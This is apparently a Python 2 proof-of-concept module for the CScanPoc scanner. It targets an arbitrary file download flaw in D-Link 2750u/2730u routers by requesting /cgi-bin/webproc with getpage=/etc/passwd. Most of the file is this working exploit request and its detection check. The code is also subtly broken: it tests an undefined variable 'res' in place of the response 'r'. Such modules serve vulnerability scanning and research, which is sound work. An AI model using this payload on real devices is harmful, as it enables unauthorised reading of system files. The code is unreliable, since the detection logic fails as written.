# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re
import urlparse

class Vuln(ABVuln):
    poc_id = 'a3e0070a-558f-4fda-98e3-5d0f843cb570'
    name = 'D-Link 任意文件下载'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.FILE_DOWNLOAD # 漏洞类型
    disclosure_date = '2015-05-28'  # 漏洞公布时间
    desc = '''
        访问 http://foobar/cgi-bin/webproc?var:page=wizard&var:menu=setup&getpage=/etc/passwd
        读取任意文件。
    '''  # 漏洞描述
    ref = 'http://seclists.org/fulldisclosure/2015/May/129'  # 漏洞来源
    cnvd_id = 'Unkonwn'  # cnvd漏洞编号
    cve_id = 'Unkonwn'  # cve编号
    product = 'D-Link'  # 漏洞应用名称
    product_version = '2750u/2730u'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '1f038af3-eff6-4496-b610-b927dca58b78'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-17'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            payload = '/cgi-bin/webproc?var:page=wizard&var:menu=setup&getpage=/etc/passwd'
            url = self.target + payload
            r = requests.get(url)
            
            if r.status_code == 200 and 'root:/bin/sh' in res:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()
